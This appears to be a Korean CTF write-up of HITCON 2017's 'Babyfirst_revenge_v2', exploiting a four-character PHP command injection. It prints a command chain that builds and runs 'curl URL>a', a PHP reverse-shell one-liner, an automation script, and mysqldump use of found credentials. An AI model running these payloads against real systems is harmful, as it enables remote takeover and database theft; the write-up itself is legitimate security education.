# [WEB] HITCON 2017 - Babyfirst_revenge_v2

# Description

http://52.197.41.31/

# Analysis

Babyfirst_revenge의 하드모드다.

문제 페이지에 접근하면 소스는 다음과같다.

```php+html
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

소스는 전과 같은데 cmd파라미터로 **입력받은 값의 길이가 4 이하**로 변경되었다.

공격해보자.

# Exploit

Babyfirst_revenge에서는 >>를 통해 파일을 만들었는데 여기서는 길이 제한때문에 사용이 불가능하다.

rev명령어를 사용해 문자열을 만들어보자.

쿼리는 다음과 같다.

```bash
>dir
>sl
>ht-
>g\>
*>v
# dir을 통해 리스팅 한 값으로 'v' 파일을 생성하며, 내용으로는 'g> ht- sl'가 들어간다.
>rev
*v>x
# rev명령어를 통해 'v' 파일의 내용을 reverse하고 'x'파일로 저장한다.
# 'x'의 내용은 'ls -ht >g'가 된다.
>a
>\>\
>L\
>UR\
>\ \
>rl\
>cu\
sh x
# 'x' 파일을 쉘 스크립트로써 실행해주며 'ls -t >g'의 수행 결과가 'g'파일에 들어가게 된다.
# 들어가는 내용은 최종적으로 'curl URL>a'가 된다.
sh g
# 'g'파일을 쉘 스크립트로써 실행하면 'curl' 명령어가 실행되 URL의 index페이지를 'a'파일로 저장하게 된다.
sh a
# 그 후 저장된 index을 쉘 스크립트로써 실행한다.
```

index페이지에 들어가는 내용은 다음과 같다.

```Bash
php -r '$sock=fsockopen("URL",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

그로인해 완성된 코드는 다음과 같다.

```python
import requests
import urllib
import time

cmds = ['>dir','>sl','>ht-','>g\\>','*>v','>rev','*v>x','>a','>\>\\','>L\\','>UR\\','>\\ \\','>rl\\','>cu\\','sh x','sh g','sh a']

r = requests.get('http://52.197.41.31/?reset=1')
for d in cmds:
    r = requests.get('http://52.197.41.31/?cmd='+urllib.quote(d))
    print d
    time.sleep(0.5)
```

nc로 포트를 열어놓고 위 코드를 실행하면 쉘이 떨어진다!

다시한번 디렉토리를 탐색 해보자.

```
$ cd /home
$ ls
_f14444444g
orange
ubuntu
$ cd _f14444444g
$ ls
this
$ cd this
$ ls
is
$ cd is
$ ls
the
$ cd the
$ ls
final
$ cd final
$ ls
fl4g
$ cd fl4g
$ ls
README.txt
$ cat *
Flag is in the MySQL database
f14444444g / tq8yVcJQMLfr6QPG
```

이번에도 DB안에 플래그가 있는 모양이다.

이번에는 mysqldump를 이용해 파일을 추출해보자.

```
$ mysqldump --single-transaction -uf14444444g -ptq8yVcJQMLfr6QPG --all-databases > /var/www/html/sandbox/d7158d83a9ad732cc15b75154b9c05e5/dump.sql 2>&1
```

생성된 파일을 다운받아 열어보면 다음과 같으며 플래그를 얻을 수 있다.

```sql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- MySQL dump 10.13  Distrib 5.7.20, for Linux (x86_64)
--
-- Host: localhost    Database: 
-- ------------------------------------------------------
-- Server version	5.7.20-0ubuntu0.16.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Current Database: `f14gdb`
--

CREATE DATABASE /*!32312 IF NOT EXISTS*/ `f14gdb` /*!40100 DEFAULT CHARACTER SET latin1 */;

USE `f14gdb`;

--
-- Table structure for table `this_is_the_fl4g`
--

DROP TABLE IF EXISTS `this_is_the_fl4g`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `this_is_the_fl4g` (
  `secret` text
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `this_is_the_fl4g`
--

LOCK TABLES `this_is_the_fl4g` WRITE;
/*!40000 ALTER TABLE `this_is_the_fl4g` DISABLE KEYS */;
INSERT INTO `this_is_the_fl4g` VALUES ('hitcon{wow,you_r_shell_m4st3r!!!}');
/*!40000 ALTER TABLE `this_is_the_fl4g` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2017-11-06 10:27:45
```



**hitcon{wow,you_r_shell_m4st3r!!!}**